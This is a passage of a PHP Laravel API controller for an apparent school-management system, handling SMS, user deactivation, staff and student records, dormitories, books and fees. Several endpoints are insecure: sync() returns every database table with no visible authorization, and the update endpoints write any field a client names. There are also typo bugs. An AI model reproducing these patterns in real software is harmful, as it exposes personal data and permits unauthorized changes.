<?php

namespace App\Http\Controllers;
use App\Role;
use App\Services\FirebasePushService;
use App\User;
use App\AramiscBook;
use App\AramiscExam;
use App\AramiscItem;
use App\AramiscClass;
use App\AramiscEvent;
use App\AramiscRoute;
use App\AramiscStaff;
use App\AramiscModule;
use App\AramiscParent;
use App\AramiscSchool;
use App\AramiscCountry;
use App\AramiscHoliday;
use App\AramiscSection;
use App\AramiscStudent;
use App\AramiscSubject;
use App\AramiscUserLog;
use App\AramiscVehicle;
use App\AramiscVisitor;
use App\AramiscWeekend;
use App\tableList;
use App\YearCheck;
use App\AramiscCurrency;
use App\AramiscExamType;
use App\AramiscFeesType;
use App\AramiscHomework;
use App\AramiscItemSell;
use App\AramiscLanguage;
use App\AramiscRoomList;
use App\AramiscSupplier;
use App\AramiscTimeZone;
use App\AramiscAddIncome;
use App\AramiscBaseGroup;
use App\AramiscBaseSetup;
use App\AramiscBookIssue;
use App\AramiscClassRoom;
use App\AramiscClassTime;
use App\AramiscComplaint;
use App\AramiscExamSetup;
use App\AramiscFeesGroup;
use App\AramiscItemIssue;
use App\AramiscItemStore;
use App\AramiscLeaveType;
use App\AramiscMarkStore;
use App\AramiscAddExpense;
use App\AramiscDateFormat;
use App\AramiscFeesAssign;
use App\AramiscFeesMaster;
use App\AramiscMarksGrade;
use App\AramiscOnlineExam;
use App\AramiscSetupAdmin;
use App\AramiscSmsGateway;
use App\ApiBaseMethod;
use App\AramiscBankAccount;
use App\AramiscContentType;
use App\AramiscFeesPayment;
use App\AramiscItemReceive;
use App\AramiscLeaveDefine;
use App\AramiscNoticeBoard;
use App\AramiscResultStore;
use App\AramiscAcademicYear;
use App\AramiscBookCategory;
use App\AramiscClassSection;
use App\AramiscExamSchedule;
use App\AramiscFeesDiscount;
use App\AramiscItemCategory;
use App\AramiscLeaveRequest;
use App\AramiscNotification;
use App\AramiscStudentGroup;
use App\AramiscAssignSubject;
use App\AramiscAssignVehicle;
use App\AramiscDormitoryList;
use App\AramiscLibraryMember;
use App\AramiscMarksRegister;
use App\AramiscPostalReceive;
use App\AramiscSystemVersion;
use App\AramiscChartOfAccount;
use App\AramiscPaymentMethhod;
use App\AramiscPostalDispatch;
use App\AramiscRolePermission;
use App\AramiscBankPaymentSlip;
use App\AramiscGeneralSettings;
use App\AramiscStaffAttendence;
use App\AramiscStudentCategory;
use App\AramiscStudentDocument;
use App\AramiscStudentTimeline;
use App\AramiscModuleManager;
use App\Scopes\SchoolScope;
use App\AramiscFeesCarryForward;
use App\AramiscStudentPromotion;
use App\AramiscHrPayrollGenerate;
use App\AramiscStudentAttendance;
use Illuminate\Http\Request;
use App\Models\StudentRecord;
use App\AramiscAssignClassTeacher;
use App\AramiscFeesAssignDiscount;
use App\AramiscTemporaryMeritlist;
use Illuminate\Support\Carbon;
use App\AramiscClassOptionalSubject;
use App\AramiscTeacherUploadContent;
use App\AramiscOptionalSubjectAssign;
use App\AramiscStudentTakeOnlineExam;
use App\AramiscUploadHomeworkContent;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Log;
use App\Http\Controllers\Controller;
use Brian2694\Toastr\Facades\Toastr;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use Intervention\Image\Facades\Image;
use Illuminate\Support\Facades\Schema;
use App\Scopes\ActiveStatusSchoolScope;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\Session;
use Illuminate\Support\Facades\Response;
use App\Scopes\StatusAcademicSchoolScope;
use Illuminate\Support\Facades\Validator;
use App\Notifications\HomeworkNotification;
use Illuminate\Support\Facades\Notification;
use Modules\RolePermission\Entities\AramiscRole;
use Modules\RolePermission\Entities\Permission;
use Modules\AramiscBiometrics\Entities\AramiscBioSetting;
use Modules\RolePermission\Entities\AssignPermission;
use App\Notifications\StudyMeterialCreatedNotification;

class AramiscApiController extends Controller
{


    // send sms
    public function SendSMS(Request $request)
    {
        $input = $request->all();
        //return ApiBaseMethod::sendResponse($input, null);
        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $validator = Validator::make($input, [
                'phonenumber' => "required",
                'sender_id' => "required|integer",
                'api_password' => "required",
                'api_id' => "required",
                'sms_type' => "required",
                'encoding' => "required",
                'textmessage' => "required",
            ]);
        }
        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
        }

        try {
            $smsGateway = AramiscSmsGateway::where(['clickatell_api_id' => $request->api_id, 'clickatell_password' => $request->api_password, 'active_status' => 1])->first();
            $sender = User::find($request->sender_id);
            if (is_null($smsGateway)) {
                return ApiBaseMethod::sendError('Api credentials not match ');
            }
            if (is_null($sender)) {
                return ApiBaseMethod::sendError('Sender id is not correct');
            }
            $d = sendSMSApi($request->phonenumber, $request->textmessage, $smsGateway->id);
            $data = [];
            $data['message'] = 'opretion Successfully';
            return ApiBaseMethod::sendResponse($data, null);
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Something went wrong!');
        }
    }

    public function deleteUser(Request $request){
        $user = User::find($request->id);
        $data = [];
        if($user){
            if($user->rol_id == 2){
                $user->active_status = 0 ;
                $student = $user->student;
                $student->active_status = 0 ;
                $student->save();
                $user->save();
            }elseif($user->role_id==3){
                $user->active_status = 0 ;
                $parent = $user->parent;
                $parent->active_status = 0 ;
                $parent->save();
                $user->save();
            }elseif($user->rol_id != 1){
                $user->active_status = 0 ;
                $staff = $user->staff;
                $staff->active_status = 0 ;
                $staff->save();
                $user->save();
            }

            $data['message'] = 'User Deleted';
            $data['flag'] = TRUE;
            return ApiBaseMethod::sendResponse($data, null);

        }else{
            $data['message'] = 'Operation Failed !';
            $data['flag'] = FALSE;
            return ApiBaseMethod::sendResponse($data, null);
        }

    }
    
    public function privacyPermissionStatus(Request $request)
    {
        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $r = AramiscGeneralSettings::find(1);

            if ($r) {
                $data = [];
                $data['message'] = 'Get data Successfully';
                $data['phone_number_privacy'] = $r->phone_number_privacy;
                return ApiBaseMethod::sendResponse($data, null);
            } else {
                $data = [];
                $data['message'] = 'Operation Failed !';
                $data['flag'] = FALSE;
                return ApiBaseMethod::sendResponse($data, null);
            }
        }
    }


    public function privacyPermission(Request $request, $value)
    {
        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $data = AramiscGeneralSettings::find(1);
            $data->phone_number_privacy = $value;
            $r = $data->save();

            if ($r) {
                $data = [];
                $data['message'] = 'Update Successfully';
                $data['flag'] = TRUE;
                return ApiBaseMethod::sendResponse($data, null);
            } else {
                $data = [];
                $data['message'] = 'Operation Failed !';
                $data['flag'] = FALSE;
                return ApiBaseMethod::sendResponse($data, null);
            }
        }
    }

    public function sync(Request $request)
    {
        $data = [];
        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $tables                = DB::select('SHOW TABLES');
            $table_list            = [];
            $table_lastinserted_id = [];
            $tableString = 'Tables_in_' . DB::connection()->getDatabaseName();


            foreach ($tables as $table) {
                $table_name              = $table->$tableString;

                $table_list[]            = $table_name;
                $item = DB::table($table_name)->orderBy('id', 'DESC')->first();
                $table_lastinserted_id[$table_name] = $item->id;
            }

            foreach ($table_list as $name) {
                $data[$name] = DB::table($name)->get();
            }

            $response = [
                'success' => true,
                'data'    => $data,
                'message' => null,
            ];
            return $response;
        }
    }
    public function checkColumnAvailable(Request $request)
    {
        if (!Schema::hasColumn('aramisc_general_settings', 'api_url')) {
            Schema::table('aramisc_general_settings', function ($table) {
                $table->integer('api_url')->default(0);
            });
        }
        $data = AramiscGeneralSettings::find(1);
        if ($data->api_url == 0) {

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {

                $response = [
                    'success' => false,
                    'data'    => '',
                    'message' => null,
                ];

                return $response;
            }
        } else {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];

                $response = [
                    'success' => true,
                    'data'    => '',
                    'message' => null,
                ];
                return $response;
            }
        }
    }
    public function UpdateStaffApi(Request $request)
    {

        $input = $request->all();
        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $validator = Validator::make($input, [
                'field_name' => "required"

            ]);
        }
        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
        }
        if (!empty($request->field_name)) {
            $request_string = $request->field_name;
            $request_id = $request->id;
            $data = AramiscStaff::find($request_id);
            $data->$request_string = $request->$request_string;
            if ($request_string == "email") {
                $user = User::find($data->user_id);
                $user->email = $request->$request_string;
                $user->save();
            } else if ($request_string == "first_name") {
                $full_name = $request->$request_string . ' ' . $data->last_name;
                $data->full_name = $full_name;
                $user = User::find($data->user_id);
                $user->full_name = $data->full_name;
                $user->save();
            } else if ($request_string == "last_name") {
                $full_name = $data->first_name . ' ' .  $request->$request_string;
                $data->full_name = $full_name;
                $user = User::find($data->user_id);
                $user->full_name = $data->full_name;
                $user->save();
            } else if ($request_string == "staff_photo") {
                $file = $request->file('staff_photo');
                $images = Image::make($file)->resize(100, 100)->insert($file, 'center');
                $staff_photos = md5($file->getClientOriginalName() . time()) . "." . $file->getClientOriginalExtension();
                $images->save('public/uploads/staff/' . $staff_photos);
                $staff_photo = 'public/uploads/staff/' . $staff_photos;
                $data->staff_photo = $staff_photo;
            }
            $data->save();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['message'] = 'Updated';
                $data['flag'] = TRUE;
                return ApiBaseMethod::sendResponse($data, null);
            }
        } else {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['message'] = 'Invalid Input';
                $data['flag'] = FALSE;
                return ApiBaseMethod::sendError($data, null);
            }
        }
    }
    public function UpdateStudentApi(Request $request)
    {

        $input = $request->all();
        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $validator = Validator::make($input, [
                'field_name' => "required"

            ]);
        }
        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
        }
        if (!empty($request->field_name)) {
            $request_string = $request->field_name;
            $request_id = $request->id;
            $data = AramiscStudent::find($request_id);
            $data->$request_string = $request->$request_string;
            if ($request_string == "first_name") {
                $full_name = $request->$request_string . ' ' . $data->last_name;
                $data->full_name = $full_name;
            } else if ($request_string == "last_name") {
                $full_name = $data->first_name . ' ' .  $request->$request_string;
                $data->full_name = $full_name;
            } else if ($request_string == "student_photo") {
                $file = $request->file('student_photo');
                $images = Image::make($file)->resize(100, 100)->insert($file, 'center');
                $student_photos = md5($file->getClientOriginalName() . time()) . "." . $file->getClientOriginalExtension();
                $images->save('public/uploads/student/' . $student_photos);
                $student_photo = 'public/uploads/student/' . $student_photos;
                $data->student_photo = $student_photo;
            }
            $data->save();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['message'] = 'Updated';
                $data['flag'] = TRUE;
                return ApiBaseMethod::sendResponse($data, null);
            }
        } else {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['message'] = 'Invalid Input';
                $data['flag'] = FALSE;
                return ApiBaseMethod::sendError($data, null);
            }
        }
    }
    public function roomList(Request $request)
    {
        $studentDormitory = DB::table('aramisc_room_lists')
            ->join('aramisc_dormitory_lists', 'aramisc_room_lists.dormitory_id', '=', 'aramisc_dormitory_lists.id')
            ->join('aramisc_room_types', 'aramisc_room_lists.room_type_id', '=', 'aramisc_room_types.id')
            ->select('aramisc_room_lists.id', 'aramisc_dormitory_lists.dormitory_name', 'aramisc_room_lists.name as room_number', 'aramisc_room_lists.number_of_bed', 'aramisc_room_lists.cost_per_bed', 'aramisc_room_lists.active_status')
            ->get();

        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            return ApiBaseMethod::sendResponse($studentDormitory, null);
        }
    }
    public function dormitoryList(Request $request)
    {
        $dormitory_lists = DB::table('aramisc_dormitory_lists')
            ->where('active_status', 1)
            ->get();

        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $data = [];
            $data['dormitory_lists'] = $dormitory_lists->toArray();
            return ApiBaseMethod::sendResponse($data, null);
        }
    }
    public function saas_dormitoryList(Request $request, $school_id)
    {
        $dormitory_lists = DB::table('aramisc_dormitory_lists')
            ->where('active_status', 1)
            ->where('school_id',$school_id)->get();

        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $data = [];
            $data['dormitory_lists'] = @$dormitory_lists->toArray();
            return ApiBaseMethod::sendResponse($data, null);
        }
    }
    public function systemRole(Request $request)
    {
        $role_list = DB::table('aramisc_roles')
            ->where('active_status', 1)
            ->get();

        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $data = [];
            $data['role_list'] = $role_list->toArray();
            return ApiBaseMethod::sendResponse($data, null);
        }
    }
    public function roomTypeList(Request $request)
    {
        $room_type_lists = DB::table('aramisc_room_types')
            ->select('id', 'type')
            ->where('active_status', 1)
            ->get();

        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $data = [];
            $data['room_type_lists'] = $room_type_lists->toArray();
            return ApiBaseMethod::sendResponse($data, null);
        }
    }
    public function saas_roomTypeList(Request $request, $school_id)
    {
        $room_type_lists = DB::table('aramisc_room_types')
            ->select('id', 'type')
            ->where('active_status', 1)
            ->where('school_id',$school_id)->get();

        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $data = [];
            $data['room_type_lists'] = $room_type_lists->toArray();
            return ApiBaseMethod::sendResponse($data, null);
        }
    }
    public function storeRoom(Request $request)
    {
        $input = $request->all();
        $validator = Validator::make($input, [
            'room_number' => "required",
            'dormitory' => "required",
            'room_type' => "required",
            'number_of_bed' => "required|max:2",
            'cost_per_bed' => "required|max:11"
        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }

        $room_list = new AramiscRoomList();
        $room_list->name = $request->room_number;
        $room_list->dormitory_id = $request->dormitory;
        $room_list->room_type_id = $request->room_type;
        $room_list->number_of_bed = $request->number_of_bed;
        $room_list->cost_per_bed = $request->cost_per_bed;
        $room_list->description = $request->description;
        $room_list->school_id = 1;
        $room_list->academic_id = AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR();
        $result = $room_list->save();

        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            if ($result) {
                return ApiBaseMethod::sendResponse(null, 'Room has been created successfully');
            } else {
                return ApiBaseMethod::sendError('Something went wrong, please try again');
            }
        }
    }
    public function saas_storeRoom(Request $request)
    {
        $input = $request->all();
        $validator = Validator::make($input, [
            'room_number' => "required",
            'dormitory' => "required",
            'room_type' => "required",
            'number_of_bed' => "required|max:2",
            'cost_per_bed' => "required|max:11",
            'school_id' => "required"
        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }

        $room_list = new AramiscRoomList();
        $room_list->name = $request->room_number;
        $room_list->dormitory_id = $request->dormitory;
        $room_list->room_type_id = $request->room_type;
        $room_list->number_of_bed = $request->number_of_bed;
        $room_list->cost_per_bed = $request->cost_per_bed;
        $room_list->description = $request->description;
        $room_list->school_id = $request->school_id;
        $room_list->academic_id = AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR();
        $result = $room_list->save();

        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            if ($result) {
                return ApiBaseMethod::sendResponse(null, 'Room has been created successfully');
            } else {
                return ApiBaseMethod::sendError('Something went wrong, please try again');
            }
        }
    }

    public function updateRoom(Request $request)
    {
        $input = $request->all();
        $validator = Validator::make($input, [
            'room_number' => "required",
            'dormitory' => "required",
            'room_type' => "required",
            'number_of_bed' => "required|max:2",
            'cost_per_bed' => "required|max:11"
        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }
        $room = AramiscRoomList::find($request->id);
        $room->name = $request->room_number;
        $room->dormitory_id = $request->dormitory;
        $room->room_type_id = $request->room_type;
        $room->number_of_bed = $request->number_of_bed;
        $room->cost_per_bed = $request->cost_per_bed;
        $room->description = $request->description;
        $room->academic_id = AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR();
        $result = $room->save();

        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            if ($result) {
                return ApiBaseMethod::sendResponse(null, 'Room has been updated successfully');
            } else {
                return ApiBaseMethod::sendError('Something went wrong, please try again');
            }
        }
    }
    public function saas_updateRoom(Request $request)
    {
        $input = $request->all();
        $validator = Validator::make($input, [
            'room_number' => "required",
            'dormitory' => "required",
            'room_type' => "required",
            'number_of_bed' => "required|max:2",
            'cost_per_bed' => "required|max:11",
            'school_id' => "required"
        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }
        $room = AramiscRoomList::find($request->id);
        $room->name = $request->room_number;
        $room->dormitory_id = $request->dormitory;
        $room->room_type_id = $request->room_type;
        $room->number_of_bed = $request->number_of_bed;
        $room->cost_per_bed = $request->cost_per_bed;
        $room->description = $request->description;
        $room->school_id = $request->school_id;
        $room->academic_id = AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR();
        $result = $room->save();

        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            if ($result) {
                return ApiBaseMethod::sendResponse(null, 'Room has been updated successfully');
            } else {
                return ApiBaseMethod::sendError('Something went wrong, please try again');
            }
        }
    }
    public function deleteRoom(Request $request, $id)
    {
        $key_id = 'room_id';
        $tables = tableList::getTableList($key_id,$id);
        try {
            $delete_query = AramiscRoomList::destroy($id);
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($delete_query) {
                    return ApiBaseMethod::sendResponse(null, 'Room has been deleted successfully');
                }
            }
        } catch (\Illuminate\Database\QueryException $e) {
            $msg = 'This data already used in  : Student information table, Please remove those data first';
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {

                return ApiBaseMethod::sendResponse(null,  $msg);
            }
        }
    }
    public function saas_deleteRoom(Request $request,$school_id, $id)
    {
        $key_id = 'room_id';
        $tables = tableList::getTableList($key_id,$id);
        try {
            $delete_query = AramiscRoomList::where('school_id',$school_id)->where('id',$id)->delete();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($delete_query) {
                    return ApiBaseMethod::sendResponse(null, 'Room has been deleted successfully');
                }
            }
        } catch (\Illuminate\Database\QueryException $e) {
            $msg = 'This data already used in  : Student information table, Please remove those data first';
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {

                return ApiBaseMethod::sendResponse(null,  $msg);
            }
        }
    }


    public function addDormitory(Request $request)
    {
        $input = $request->all();
        $validator = Validator::make($input, [
            'dormitory_name' => "required|unique:aramisc_dormitory_lists,dormitory_name",
            'type' => "required",
            'intake' => "required"
        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }




        $dormitory_list = new AramiscDormitoryList();
        $dormitory_list->dormitory_name = $request->dormitory_name;
        $dormitory_list->type = $request->type;
        $dormitory_list->address = $request->address;
        $dormitory_list->intake = $request->intake;
        $dormitory_list->description = $request->description;
        $dormitory_list->academic_id = AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR();
        $result = $dormitory_list->save();

        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            if ($result) {
                return ApiBaseMethod::sendResponse(null, 'Dormitory has been created successfully');
            }
        }
    }
    public function saas_addDormitory(Request $request)
    {
        $input = $request->all();
        $validator = Validator::make($input, [
            'dormitory_name' => "required|unique:aramisc_dormitory_lists,dormitory_name",
            'type' => "required",
            'intake' => "required",
            'school_id' => "required",
        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }




        $dormitory_list = new AramiscDormitoryList();
        $dormitory_list->dormitory_name = $request->dormitory_name;
        $dormitory_list->type = $request->type;
        $dormitory_list->address = $request->address;
        $dormitory_list->intake = $request->intake;
        $dormitory_list->description = $request->description;
        $dormitory_list->school_id = $request->school_id;
        $dormitory_list->academic_id = AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR();
        $result = $dormitory_list->save();

        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            if ($result) {
                return ApiBaseMethod::sendResponse(null, 'Dormitory has been created successfully');
            }
        }
    }

    public function editDormitory(Request $request)
    {
        $input = $request->all();
        $validator = Validator::make($input, [
            'dormitory_name' => "required|unique:aramisc_dormitory_lists,dormitory_name",
            'type' => "required",
            'intake' => "required"
        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }


        $dormitory_list = AramiscDormitoryList::find($request->id);
        $dormitory_list->dormitory_name = $request->dormitory_name;
        $dormitory_list->type = $request->type;
        $dormitory_list->address = $request->address;
        $dormitory_list->intake = $request->intake;
        $dormitory_list->description = $request->description;
        $dormitory_list->academic_id = AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR();
        $result = $dormitory_list->save();

        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            if ($result) {
                return ApiBaseMethod::sendResponse(null, 'Dormitory has been updated successfully');
            }
        }
    }
    public function saas_editDormitory(Request $request)
    {
        $input = $request->all();
        $validator = Validator::make($input, [
            'dormitory_name' => "required|unique:aramisc_dormitory_lists,dormitory_name",
            'type' => "required",
            'intake' => "required",
            'school_id' => "required",
        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }


        $dormitory_list = AramiscDormitoryList::find($request->id);
        $dormitory_list->dormitory_name = $request->dormitory_name;
        $dormitory_list->type = $request->type;
        $dormitory_list->address = $request->address;
        $dormitory_list->intake = $request->intake;
        $dormitory_list->description = $request->description;
        $dormitory_list->school_id = $request->school_id;
        $dormitory_list->academic_id = AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR();
        $result = $dormitory_list->save();

        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            if ($result) {
                return ApiBaseMethod::sendResponse(null, 'Dormitory has been updated successfully');
            }
        }
    }
    public function deleteDormitory(Request $request, $id)
    {
        $tables = \App\tableList::getTableList('dormitory_id',$id);
        try {
            $dormitory_list = AramiscDormitoryList::destroy($id);
            if ($dormitory_list) {
                if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                    if ($dormitory_list) {
                        return ApiBaseMethod::sendResponse(null, 'Dormitory has been deleted successfully');
                    } else {
                        return ApiBaseMethod::sendError('Something went wrong, please try again');
                    }
                }
            }
        } catch (\Illuminate\Database\QueryException $e) {

            $msg = 'This data already used in  : ' . $tables . ' Please remove those data first';

            return ApiBaseMethod::sendError($msg);
        }
    }
    public function saas_deleteDormitory(Request $request,$school_id, $id)
    {
        $tables = \App\tableList::getTableList('dormitory_id',$id);
        try {
            $dormitory_list = AramiscDormitoryList::where('school_id',$school_id)->where('id',$id)->delete();
            if ($dormitory_list) {
                if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                    if ($dormitory_list) {
                        return ApiBaseMethod::sendResponse(null, 'Dormitory has been deleted successfully');
                    } else {
                        return ApiBaseMethod::sendError('Something went wrong, please try again');
                    }
                }
            }
        } catch (\Illuminate\Database\QueryException $e) {

            $msg = 'This data already used in  : ' . $tables . ' Please remove those data first';

            return ApiBaseMethod::sendError($msg);
        }
    }
    public function getDriverList(Request $request)
    {
        $driver_list = DB::table('aramisc_staffs')
            ->where('active_status', 1)
            ->where('role_id', '=', 9)
            ->get();
        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            return ApiBaseMethod::sendResponse($driver_list, null);
        }
    }
    public function saas_getDriverList(Request $request, $school_id)
    {
        $driver_list = DB::table('aramisc_staffs')
            ->where('active_status', 1)
            ->where('role_id', '=', 9)
            ->where('school_id',$school_id)->get();
        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            return ApiBaseMethod::sendResponse($driver_list, null);
        }
    }

    public function setFcmToken(Request $request)
    {

        $user = User::find($request->id);
        $user->device_token = $request->token;
        $user->save();
        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $data = '';
            return ApiBaseMethod::sendResponse($data, 'Token Updated');
        }
    }
    public function setToken(Request $request)
    {
        if (!Schema::hasColumn('users', 'notificationToken')) {
            Schema::table('users', function ($table) {
                $table->text('notificationToken')->nullable();
            });
        }

        $user = User::find($request->id);
        $user->notificationToken = $request->token;
        $user->save();
        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $data = '';
            return ApiBaseMethod::sendResponse($data, null);
        }
    }
    public function saas_setToken(Request $request, $school_id)
    {
        if (!Schema::hasColumn('users', 'notificationToken')) {
            Schema::table('users', function ($table) {
                $table->text('notificationToken')->nullable();
            });
        }

        $user = User::where('school_id',$school_id)->find($request->id);
        $user->notificationToken = $request->token;
        $user->save();
        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $data = '';
            return ApiBaseMethod::sendResponse($data, null);
        }
    }





    public function bookCategory(Request $request)
    {
        $book_category = DB::table('aramisc_book_categories')->get();
        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            return ApiBaseMethod::sendResponse($book_category, null);
        }
    }
    public function addBook(Request $request)
    {
        $input = $request->all();
        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $validator = Validator::make($input, [
                'book_title' => "required",
                'book_category_id' => "required",
                'subject' => "required",
                'user_id' => "required"
            ]);
        }
        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }
        $books = new AramiscBook();
        $books->book_title = $request->book_title;
        $books->book_category_id = $request->book_category_id;
        $books->book_number = $request->book_number;
        $books->isbn_no = $request->isbn_no;
        $books->publisher_name = $request->publisher_name;
        $books->author_name = $request->author_name;
        $books->subject_id = $request->subject;
        $books->rack_number = $request->rack_number;
        $books->quantity = $request->quantity;
        $books->book_price = $request->book_price;
        $books->details = $request->details;
        $books->post_date = date('Y-m-d');
        $books->created_by = $request->user_id;
        $books->academic_id = AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR();
        $results = $books->save();

        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            if ($results) {
                return ApiBaseMethod::sendResponse(null, 'New Book has been added successfully.');
            } else {
                return ApiBaseMethod::sendError('Something went wrong, please try again.');
            }
        }
    }
    public function member_role(Request $request)
    {

        $roles = AramiscRole::where('active_status', '=', 1)->where(function ($q) {
            $q->where('school_id', Auth::user()->school_id)->orWhere('type', 'System');
        })->orderBy('id', 'desc')->get();

        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            return ApiBaseMethod::sendResponse($roles, null);
        }
    }
    public function saas_member_role(Request $request, $school_id)
    {

        $roles = AramiscRole::where('active_status', '=', 1)->where(function ($q) {
            $q->where('school_id', Auth::user()->school_id)->orWhere('type', 'System');
        })->orderBy('id', 'desc')->get();

        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            return ApiBaseMethod::sendResponse($roles, null);
        }
    }

    public function feesMasterStore(Request $request)
    {
        $input = $request->all();
        if ($request->fees_group == "" || $request->fees_group != 1 && $request->fees_group != 2) {


            $validator = Validator::make($input, [
                'fees_group' => "required",
                'fees_type' => "required",
                'date' => "required",
                'amount' => "required"
            ]);
        } else {
            $validator = Validator::make($input, [
                'fees_group' => "required",
                'fees_type' => "required",
                'date' => "required"
            ]);
        }
        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
        }

        $combination = AramiscFeesMaster::where('fees_group_id', $request->fees_group)->where('fees_type_id', $request->fees_type)->count();

        if ($combination == 0) {
            $fees_master = new AramiscFeesMaster();
            $fees_master->fees_group_id = $request->fees_group;
            $fees_master->fees_type_id = $request->fees_type;
            $fees_master->date = date('Y-m-d', strtotime($request->date));
            if ($request->fees_group != 1 && $request->fees_group != 2) {
                $fees_master->amount = $request->amount;
            } else {
                $fees_master->amount = NULL;
            }
            $fees_master->academic_id = AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR();
            $result = $fees_master->save();
            if ($result) {
                if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                    return ApiBaseMethod::sendResponse(null, 'Fees Master added successfully');
                }
            } else {
                return ApiBaseMethod::sendError('Operation Failed.', $validator->errors());
            }
        } else {
            return ApiBaseMethod::sendError('Operation Failed.', $validator->errors());
        }
    }
    public function saas_feesMasterStore(Request $request,$school_id)
    {
        $input = $request->all();
